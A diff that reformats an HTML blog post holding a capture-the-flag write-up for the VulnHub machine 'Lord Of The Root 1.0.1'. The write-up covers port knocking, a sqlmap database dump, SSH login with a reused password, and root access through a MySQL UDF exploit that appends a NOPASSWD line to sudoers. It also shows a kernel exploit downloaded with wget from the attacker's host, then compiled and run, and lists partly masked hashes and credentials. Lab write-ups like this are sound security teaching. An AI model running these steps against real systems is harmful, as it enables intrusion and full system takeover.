@@ -1,41 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-
-    <title>Mannthan</title>
-    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
-    <script src="/static/js/highlight.min.js"></script>
-    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
-    <link rel="stylesheet" href="/static/css/github-gist.min.css">
-    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
-
-   </head>
-  <body>
-    <div class="header">
-      <table>
-        <tr>
-          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
-          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
-          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
-          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
-        </tr>
-      </table>
-    </div>
-    <div class="body">
-          <h1>[VulnHub] Lord Of The Root: 1.0.1</h1>
-                  <p><a href="/posts/20191010_vulnhub-linsecurity1.html"> « </a>📅 published on <code>10/Oct/2019</code><a href="/posts/20191011_vulnhub-misdirection1.html"> » </a></p>
-                <h2>Overview</h2>
-<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root: 1.0.1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
-<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_lordoftheroot101/killchain.png" /></p>
-<h2>Phase #1: Enumeration</h2>
-<p>1. Here's the Nmap scan result:  </p>
-<pre><code># Nmap 7.70 scan initiated Thu Oct 10 14:06:38 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/xml/_quick_tcp_nmap.xml 192.168.92.151
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1>[VulnHub] Lord Of The Root: 1.0.1</h1><p><a href=/posts/20191010_vulnhub-linsecurity1.html> « </a>📅 published on <code>10/Oct/2019</code><a href=/posts/20191011_vulnhub-misdirection1.html> » </a></p><h2>Overview</h2><p>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/lord-of-the-root-101,129/ >Lord Of The Root: 1.0.1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><p><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_lordoftheroot101/killchain.png></p><h2>Phase #1: Enumeration</h2><p>1. Here's the Nmap scan result: </p><pre><code># Nmap 7.70 scan initiated Thu Oct 10 14:06:38 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/xml/_quick_tcp_nmap.xml 192.168.92.151
 Nmap scan report for 192.168.92.151
 Host is up, received arp-response (0.00035s latency).
 Scanned at 2019-10-10 14:06:39 PDT for 5s
@@ -58,10 +21,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Oct 10 14:06:44 2019 -- 1 IP address (1 host up) scanned in 5.59 seconds
-</code></pre>
-
-<p>2. We just have 1 open port, <code>22/tcp</code> and start there. Upon connecting we see a banner that hints at port knocking sequence <code>1,2,3</code>. We knock on these ports and find a new port, <code>1337/tcp</code>, open up on the target system:  </p>
-<pre><code>ssh root@192.168.92.151
+</code></pre><p>2. We just have 1 open port, <code>22/tcp</code> and start there. Upon connecting we see a banner that hints at port knocking sequence <code>1,2,3</code>. We knock on these ports and find a new port, <code>1337/tcp</code>, open up on the target system: </p><pre><code>ssh root@192.168.92.151
                                                     .____    _____________________________
                                                     |    |   \_____  \__    ___/\______   \
                                                     |    |    /   |   \|    |    |       _/
@@ -81,13 +41,7 @@ knock 192.168.92.151 1,2,3
   PORT     STATE SERVICE
   22/tcp   open  ssh
   1337/tcp open  waste
-</code></pre>
-
-<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot01.png" />  </p>
-<p><img alt="writeup.enumeration.steps.2.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot02.png" />  </p>
-<p><img alt="writeup.enumeration.steps.2.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot03.png" />  </p>
-<p>3. We see that the newly opened port is running a HTTP service. We explore it using a web browser. We find a Base64 encoded text within HTML source of the <code>robots.txt</code> page. Upon decoding it twice we find a directory path which leads to a login form:  </p>
-<pre><code>http://192.168.92.151:1337/robots.txt
+</code></pre><p><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot01.png> </p><p><img alt=writeup.enumeration.steps.2.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot02.png> </p><p><img alt=writeup.enumeration.steps.2.3 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot03.png> </p><p>3. We see that the newly opened port is running a HTTP service. We explore it using a web browser. We find a Base64 encoded text within HTML source of the <code>robots.txt</code> page. Upon decoding it twice we find a directory path which leads to a login form: </p><pre><code>http://192.168.92.151:1337/robots.txt
   THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
 
 b64d THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
@@ -95,42 +49,15 @@ b64d THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
 
 b64d Lzk3ODM0NTIxMC9pbmRleC5waHA=
   /978345210/index.php
-</code></pre>
-
-<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot04.png" />  </p>
-<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot05.png" />  </p>
-<p><img alt="writeup.enumeration.steps.3.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot06.png" />  </p>
-<h3>Findings</h3>
-<h4>Open Ports:</h4>
-<pre><code>22/tcp    |  ssh   |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
+</code></pre><p><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot04.png> </p><p><img alt=writeup.enumeration.steps.3.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot05.png> </p><p><img alt=writeup.enumeration.steps.3.3 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot06.png> </p><h3>Findings</h3><h4>Open Ports:</h4><pre><code>22/tcp    |  ssh   |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
 1337/tcp  |  http  |  Apache httpd 2.4.7 ((Ubuntu))
-</code></pre>
-
-<h4>Files</h4>
-<pre><code>http://192.168.92.151:1337/robots.txt
+</code></pre><h4>Files</h4><pre><code>http://192.168.92.151:1337/robots.txt
 http://192.168.92.151:1337/978345210/index.php
-</code></pre>
-
-<h4>Users</h4>
-<pre><code>ssh: smeagol
+</code></pre><h4>Users</h4><pre><code>ssh: smeagol
 webapp: frodo, smeagol, aragorn, legolas, gimli
-</code></pre>
-
-<h2>Phase #2: Exploitation</h2>
-<p>1. We run <code>sqlmap</code> against this login form and dump the contents of the backend database. Within this dump we find credentials for five users:  </p>
-<pre><code>sqlmap -u &quot;http://192.168.92.151:1337/978345210/index.php&quot; --batch --forms --dump
-</code></pre>
-
-<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot07.png" />  </p>
-<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot08.png" />  </p>
-<p>2. We check if any of these users have a local account on the target system and if they have reused their web application credentials for system login as well. We find that user <code>smeagol</code> has an account on the target system and has reused their password. This gives us a local interactive SSH access on the target system:  </p>
-<pre><code>ssh smeagol@192.168.92.151
-</code></pre>
-
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot09.png" />  </p>
-<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot10.png" />  </p>
-<h2>Phase #2.5: Post Exploitation</h2>
-<pre><code>smeagol@LordOfTheRoot&gt; id
+</code></pre><h2>Phase #2: Exploitation</h2><p>1. We run <code>sqlmap</code> against this login form and dump the contents of the backend database. Within this dump we find credentials for five users: </p><pre><code>sqlmap -u &quot;http://192.168.92.151:1337/978345210/index.php&quot; --batch --forms --dump
+</code></pre><p><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot07.png> </p><p><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot08.png> </p><p>2. We check if any of these users have a local account on the target system and if they have reused their web application credentials for system login as well. We find that user <code>smeagol</code> has an account on the target system and has reused their password. This gives us a local interactive SSH access on the target system: </p><pre><code>ssh smeagol@192.168.92.151
+</code></pre><p><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot09.png> </p><p><img alt=writeup.exploitation.steps.2.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot10.png> </p><h2>Phase #2.5: Post Exploitation</h2><pre><code>smeagol@LordOfTheRoot&gt; id
 uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
 smeagol@LordOfTheRoot&gt;  
 smeagol@LordOfTheRoot&gt; uname
@@ -150,25 +77,13 @@ smeagol@LordOfTheRoot&gt;
 smeagol@LordOfTheRoot&gt; users
 root
 smeagol
-</code></pre>
-
-<h2>Phase #3: Privilege Escalation</h2>
-<p>1. While exploring the web root directory we find <code>mysql</code> credentials within the <code>login.php</code> file. This will be useful in next steps:  </p>
-<pre><code>cd /var/www
+</code></pre><h2>Phase #3: Privilege Escalation</h2><p>1. While exploring the web root directory we find <code>mysql</code> credentials within the <code>login.php</code> file. This will be useful in next steps: </p><pre><code>cd /var/www
 grep -nir mysql ./
-</code></pre>
-
-<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot11.png" />  </p>
-<p>2. We find that <code>mysql</code> is running with elevated privileges. This opens the possibility of running the UDF exploit and as such we look for <code>lib_mysqludf_sys.so</code> file on the target system. This file is not found so we have to use an exploit to create one and use it from <code>mysql</code> shell (using credentials found in previous step):  </p>
-<pre><code>ps aux | grep -i mysql
+</code></pre><p><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot11.png> </p><p>2. We find that <code>mysql</code> is running with elevated privileges. This opens the possibility of running the UDF exploit and as such we look for <code>lib_mysqludf_sys.so</code> file on the target system. This file is not found so we have to use an exploit to create one and use it from <code>mysql</code> shell (using credentials found in previous step): </p><pre><code>ps aux | grep -i mysql
 locate lib_mysqludf_sys.so
 cd /tmp
 wget http://192.168.92.183:9999/1518.c
-</code></pre>
-
-<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot12.png" />  </p>
-<p>3. We follow the steps mentioned within the exploit to compile and create the shared object file. We then connect to the <code>mysql</code> shell, load the shared object and map it to a custom function called <code>do_system</code>. This function can now be used to execute commands from within <code>mysql</code> shell with elevated privileges. We run a command to give all permissions to user <code>smeagol</code>:  </p>
-<pre><code>gcc -g -c 1518.c
+</code></pre><p><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot12.png> </p><p>3. We follow the steps mentioned within the exploit to compile and create the shared object file. We then connect to the <code>mysql</code> shell, load the shared object and map it to a custom function called <code>do_system</code>. This function can now be used to execute commands from within <code>mysql</code> shell with elevated privileges. We run a command to give all permissions to user <code>smeagol</code>: </p><pre><code>gcc -g -c 1518.c
 gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
 mysql -u localhost -u root -p
   use mysql;
@@ -180,58 +95,15 @@ mysql -u localhost -u root -p
   select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
   create function do_system returns integer soname '1518.so';
   select do_system('echo &quot;smeagol ALL =(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers');
-</code></pre>
-
-<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot16.png" />  </p>
-<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot17.png" />  </p>
-<p><img alt="writeup.privesc.steps.3.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot18.png" />  </p>
-<p><img alt="writeup.privesc.steps.3.4" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot19.png" />  </p>
-<p>4. We can now exit from the <code>mysql</code> shell, check for user <code>smeagol</code>'s <code>sudo</code> privileges and switch to user <code>root</code>:  </p>
-<pre><code>sudo -l
-</code></pre>
-
-<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot20.png" />  </p>
-<p>5. Another way to gain elevated privileges is to run the <code>overlayfs</code> exploit on the target system because it has a kernel compiled before <code>2015-12-26</code>:  </p>
-<pre><code>cd /tmp
+</code></pre><p><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot16.png> </p><p><img alt=writeup.privesc.steps.3.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot17.png> </p><p><img alt=writeup.privesc.steps.3.3 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot18.png> </p><p><img alt=writeup.privesc.steps.3.4 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot19.png> </p><p>4. We can now exit from the <code>mysql</code> shell, check for user <code>smeagol</code>'s <code>sudo</code> privileges and switch to user <code>root</code>: </p><pre><code>sudo -l
+</code></pre><p><img alt=writeup.privesc.steps.4.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot20.png> </p><p>5. Another way to gain elevated privileges is to run the <code>overlayfs</code> exploit on the target system because it has a kernel compiled before <code>2015-12-26</code>: </p><pre><code>cd /tmp
 wget http://192.168.92.183:9999/39166.c
 gcc -o 39166 39166.c
 ./39166
-</code></pre>
-
-<p><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot13.png" />  </p>
-<p><img alt="writeup.privesc.steps.5.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot14.png" />  </p>
-<p>6. Once we have elevated privileges, we can view the contents of the <code>/root/Flag.txt</code> file to complete the challenge:  </p>
-<pre><code>cat /root/Flag.txt
-</code></pre>
-
-<p><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot15.png" />  </p>
-<h2>Loot</h2>
-<h3>Hashes</h3>
-<pre><code>root:$6$cQPCchYp$rWjOEHF47iuaGk/DQdkG6Dhhfm3.hTaNZPO4MoyBz2.bn44fERcQ23XCsp43LOt5NReEUjwDF8WDa5i1M........................
+</code></pre><p><img alt=writeup.privesc.steps.5.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot13.png> </p><p><img alt=writeup.privesc.steps.5.2 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot14.png> </p><p>6. Once we have elevated privileges, we can view the contents of the <code>/root/Flag.txt</code> file to complete the challenge: </p><pre><code>cat /root/Flag.txt
+</code></pre><p><img alt=writeup.privesc.steps.6.1 src=/static/files/posts_vulnhub_lordoftheroot101/screenshot15.png> </p><h2>Loot</h2><h3>Hashes</h3><pre><code>root:$6$cQPCchYp$rWjOEHF47iuaGk/DQdkG6Dhhfm3.hTaNZPO4MoyBz2.bn44fERcQ23XCsp43LOt5NReEUjwDF8WDa5i1M........................
 smeagol:$6$vu8Pfezj$6ldY35ytL8yRd.Gp947FnW3t/WrMZXIL7sqTQS4wuSKeAiYeoYCy7yfS2rBpAPvFCPuo73phXmpOoLsg5........................
-</code></pre>
-
-<h3>Credentials</h3>
-<pre><code>webapp: frodo/iwilltaketh....., smeagol/MyPreciou....., aragorn/AndMyS...., legolas/AndM...., gimli/AndMy...
+</code></pre><h3>Credentials</h3><pre><code>webapp: frodo/iwilltaketh....., smeagol/MyPreciou....., aragorn/AndMyS...., legolas/AndM...., gimli/AndMy...
 mysql: root/darksha...
 ssh: smeagol/MyPreciou.....
-</code></pre>
-
-<h2>References</h2>
-<ul>
-<li><a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a>  </li>
-<li><a href="https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README">https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README</a>  </li>
-<li><a href="https://blog.geoda-security.com/2017/02/lord-of-r00t-walkthrough.html">https://blog.geoda-security.com/2017/02/lord-of-r00t-walkthrough.html</a>  </li>
-<li><a href="http://www.jkcybersecurity.org/2016/11/vulnhub-lord-of-root-writeup.html">http://www.jkcybersecurity.org/2016/11/vulnhub-lord-of-root-writeup.html</a>  </li>
-<li><a href="https://7ms.us/7ms-185-vulnhub-walkthrough-lord-of-the-root/">https://7ms.us/7ms-185-vulnhub-walkthrough-lord-of-the-root/</a>  </li>
-</ul>
-        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p style="text-align:center;">« <a href="/posts/20191010_vulnhub-linsecurity1.html">[VulnHub] Lin.Security: 1...</a> « | » <a href="/posts/20191011_vulnhub-misdirection1.html">[VulnHub] Misdirection: 1...</a> »</p>
-            </div>
-    <div class="footer">
-      <p style="text-align:center;">[<a href="https://creativecommons.org/licenses/by/4.0/" rel="license">📝 CC BY 4.0</a>]</p>
-    </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-  </body>
-</html>
+</code></pre><h2>References</h2><ul><li><a href=https://www.vulnhub.com/entry/lord-of-the-root-101,129/ >https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a> </li><li><a href=https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README>https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README</a> </li><li><a href=https://blog.geoda-security.com/2017/02/lord-of-r00t-walkthrough.html>https://blog.geoda-security.com/2017/02/lord-of-r00t-walkthrough.html</a> </li><li><a href=http://www.jkcybersecurity.org/2016/11/vulnhub-lord-of-root-writeup.html>http://www.jkcybersecurity.org/2016/11/vulnhub-lord-of-root-writeup.html</a> </li><li><a href=https://7ms.us/7ms-185-vulnhub-walkthrough-lord-of-the-root/ >https://7ms.us/7ms-185-vulnhub-walkthrough-lord-of-the-root/</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20191010_vulnhub-linsecurity1.html>[VulnHub] Lin.Security: 1...</a> « | » <a href=/posts/20191011_vulnhub-misdirection1.html>[VulnHub] Misdirection: 1...</a> »</p></div><div class=footer><p style=text-align:center;>[<a href=https://creativecommons.org/licenses/by/4.0/ rel=license>📝 CC BY 4.0</a>]</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script></body></html>
